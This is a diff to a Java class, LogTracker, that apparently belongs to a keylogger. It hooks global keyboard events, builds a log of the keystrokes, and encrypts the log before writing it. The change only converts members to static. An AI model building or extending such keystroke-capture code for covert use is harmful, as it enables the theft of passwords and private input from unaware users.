@@ -13,10 +13,10 @@ import lc.kra.system.mouse.event.GlobalMouseEvent;
 
 public class LogTracker {
 
-    private StringBuilder log = new StringBuilder("");
-    private boolean isCaps = false;
+    private static StringBuilder log = new StringBuilder("");
+    private static boolean isCaps = false;
 
-    public void run(LogWriter writer) {
+    public static void run(LogWriter writer) {
         new GlobalKeyboardHook().addKeyListener(new GlobalKeyAdapter() {
             @Override
             public void keyPressed(GlobalKeyEvent event) {
@@ -67,11 +67,11 @@ public class LogTracker {
         });
     }
     
-    private char checkIfMakeUpper(char c) {
+    private static char checkIfMakeUpper(char c) {
         return isCaps ? Character.toUpperCase(c) : c;
     }
 
-    private void exportString(LogWriter writer) throws IOException {
+    private static void exportString(LogWriter writer) throws IOException {
         if (log.length() != 0) {
             writer.writeLog(LogCleaner.cleanAndEncrypt(log.toString()));
         }
